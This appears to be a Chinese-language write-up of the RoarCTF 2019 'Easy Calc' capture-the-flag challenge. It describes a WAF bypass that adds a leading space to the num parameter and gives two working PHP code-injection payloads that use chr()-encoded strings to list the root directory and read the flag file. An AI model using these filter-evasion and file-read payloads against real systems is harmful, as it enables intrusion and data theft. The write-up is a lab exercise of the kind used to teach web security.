# [RoarCTF 2019]Easy Calc  
TAG:
## 解题过程：  
![20210108115046](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108115046.png)  
经过表达式的输入可以发现这就是一个简单的计算器，不存在数据库写入，注入的可能性较低，进行页面源码的检查  
![20210108155136](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108155136.png)  
获取信息：  
1. 存在```WAF```
2. 存在```calc.php```文件
访问```calc.php```文件查看，发现代码，进行代码审计  
![20210108155456](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108155456.png)  
  
获取信息：  
1. 荷载参数为num  
2. 存在黑名单过滤  
  
可以利用php的解析特性来进行WAF绕过  
当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，非法字符可以通过这样的操作来绕过  
  


1. 查看目录  
Payload:```? num=1;var_dump(scandir(chr(47)))```  
![20210108155709](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108155709.png)  
2. 取出flag  
Payload:```? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));```  
![20210108155835](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108155835.png)  
